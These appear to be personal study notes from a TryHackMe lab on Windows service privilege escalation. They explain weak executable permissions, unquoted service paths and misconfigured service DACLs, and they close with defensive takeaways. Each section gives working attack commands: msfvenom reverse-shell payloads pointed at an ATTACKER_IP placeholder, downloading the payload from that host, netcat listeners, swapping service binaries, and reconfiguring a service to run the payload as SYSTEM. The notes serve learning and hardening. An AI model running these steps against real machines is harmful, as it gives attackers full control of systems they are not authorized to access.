# Windows Services – Privilege Escalation Notes

Notes on abusing Windows services for privilege escalation. Covers service internals, insecure executable permissions, unquoted service paths, and insecure service permissions (DACLs).

---

## 1. Windows Services Background

- Windows services are managed by the **Service Control Manager (SCM)**, which starts, stops, and monitors services.
- Each service has an associated **executable** that the SCM runs on start. The executable must implement special functions to talk to the SCM (not any binary can run as a service).
- Each service also specifies the **user account** it runs under.

### Inspecting a service with `sc qc`

```cmd
sc qc apphostsvc
```

Key fields returned:
- `BINARY_PATH_NAME` – path to the executable run by the service
- `SERVICE_START_NAME` – account the service runs as

### Service DACLs

- Services have a **Discretionary Access Control List (DACL)** controlling who can start/stop/query/reconfigure them.
- Viewable via **Process Hacker**.
- All service configs live in the registry:
  ```
  HKLM\SYSTEM\CurrentControlSet\Services\
  ```
  - `ImagePath` → executable path
  - `ObjectName` → account used to start the service
  - `Security` subkey → DACL (if configured)
- Only administrators can modify these registry entries by default.

---

## 2. Insecure Permissions on Service Executable

**Concept:** If the service's executable file has weak filesystem permissions, an attacker can overwrite it. The service will then execute the attacker's payload with the privileges of the service account.

### Steps

1. **Query the service config:**
   ```cmd
   sc qc WindowsScheduler
   ```
   Note `BINARY_PATH_NAME` and `SERVICE_START_NAME` (e.g., runs as `.\svcuser1`).

2. **Check executable permissions:**
   ```cmd
   icacls C:\PROGRA~2\SYSTEM~1\WService.exe
   ```
   If `Everyone` has `(M)` (Modify) or similar write access → exploitable.

3. **Generate a payload (attacker machine):**
   ```bash
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
   python3 -m http.server
   ```

4. **Download payload on target (PowerShell):**
   ```powershell
   wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
   ```

5. **Replace the service executable:**
   ```cmd
   cd C:\PROGRA~2\SYSTEM~1\
   move WService.exe WService.exe.bkp
   move C:\Users\thm-unpriv\rev-svc.exe WService.exe
   icacls WService.exe /grant Everyone:F
   ```

6. **Start listener (attacker):**
   ```bash
   nc -lvp 4445
   ```

7. **Restart the service (target):**
   ```cmd
   sc stop windowsscheduler
   sc start windowsscheduler
   ```

> **Note:** In PowerShell, `sc` is aliased to `Set-Content` — use `sc.exe` to manage services.

**Result:** Reverse shell with the service account's privileges (e.g., `svcusr1`).

---

## 3. Unquoted Service Paths

**Concept:** If a service's `BINARY_PATH_NAME` contains spaces and isn't wrapped in quotes, the SCM tries multiple interpretations of the path — searching progressively shorter prefixes before the full path. An attacker who can write to one of those earlier paths can hijack execution.

### Example

Properly quoted (safe):
```
"C:\Program Files\RealVNC\VNC Server\vncserver.exe" -service
```

Unquoted (vulnerable):
```
C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
```

SCM search order for the unquoted path:

| Attempted Command | Arg 1 | Arg 2 |
|---|---|---|
| `C:\MyPrograms\Disk.exe` | Sorter | Enterprise\bin\disksrs.exe |
| `C:\MyPrograms\Disk Sorter.exe` | Enterprise\bin\disksrs.exe | |
| `C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe` | (intended) | |

If an attacker can drop a file at any earlier candidate path, that file runs instead of the intended binary.

### Requirements for exploitation

- The vulnerable service's binary path must be **unquoted with spaces**.
- Some **folder along the search path must be writable** by the attacker. Default installs under `C:\Program Files` are protected, but exceptions occur when:
  - An installer changes folder permissions insecurely.
  - The service is installed to a non-default, world-writable path (e.g., `C:\MyPrograms`, which can inherit `C:\`'s permissive ACLs).

### Steps

1. **Check folder permissions:**
   ```cmd
   icacls c:\MyPrograms
   ```
   Look for `BUILTIN\Users` with `AD` (create subdirectories) / `WD` (create files) rights.

2. **Generate payload & listener (attacker):**
   ```bash
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe
   nc -lvp 4446
   ```

3. **Place payload at the earliest hijackable path (target):**
   ```cmd
   move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
   icacls C:\MyPrograms\Disk.exe /grant Everyone:F
   ```

4. **Restart the service:**
   ```cmd
   sc stop "disk sorter enterprise"
   sc start "disk sorter enterprise"
   ```

**Result:** Reverse shell with the service account's privileges (e.g., `svcusr2`).

---

## 4. Insecure Service Permissions (Service DACL Misconfiguration)

**Concept:** Even if the executable and its path are secure, the **service's own DACL** might allow low-privileged users to reconfigure it (change binary path and/or run-as account). This lets an attacker point the service at an arbitrary payload run as any account, including `LocalSystem`.

### Checking the service DACL

Use **AccessChk** (Sysinternals):
```cmd
C:\tools\AccessChk> accesschk64.exe -qlc thmservice
```

Look for permissive entries such as:
```
[4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
      SERVICE_ALL_ACCESS
```
`SERVICE_ALL_ACCESS` for a low-privileged group = fully reconfigurable service.

### Steps

1. **Generate payload & listener (attacker):**
   ```bash
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe
   nc -lvp 4447
   ```

2. **Transfer payload to target** (e.g., `C:\Users\thm-unpriv\rev-svc3.exe`) and grant execute permissions:
   ```cmd
   icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
   ```

3. **Reconfigure the service** to point to the payload and run as `LocalSystem`:
   ```cmd
   sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
   ```
   > Mind the space after each `=` sign in `sc config`.

4. **Restart the service:**
   ```cmd
   sc stop THMService
   sc start THMService
   ```

**Result:** Reverse shell running as `NT AUTHORITY\SYSTEM`.

---

## Quick Reference: Key Commands

| Purpose | Command |
|---|---|
| Query service config | `sc qc <service>` |
| Check file/folder ACLs | `icacls <path>` |
| Grant full control | `icacls <path> /grant Everyone:F` |
| Check service DACL | `accesschk64.exe -qlc <service>` |
| Reconfigure service | `sc config <service> binPath= "<path>" obj= <account>` |
| Stop/start service | `sc stop <service>` / `sc start <service>` |
| Generate exe-service payload | `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<port> -f exe-service -o <file>.exe` |

## Defensive Takeaways

- Restrict write access to service executables and their containing folders.
- Always quote `BINARY_PATH_NAME` values that contain spaces.
- Audit service DACLs — don't allow `SERVICE_ALL_ACCESS` or `SERVICE_CHANGE_CONFIG` for non-admin groups.
- Avoid installing services into world-writable directories.

---
*Source: Personal study notes (TryHackMe – Windows Privilege Escalation, "Windows Services" room).*
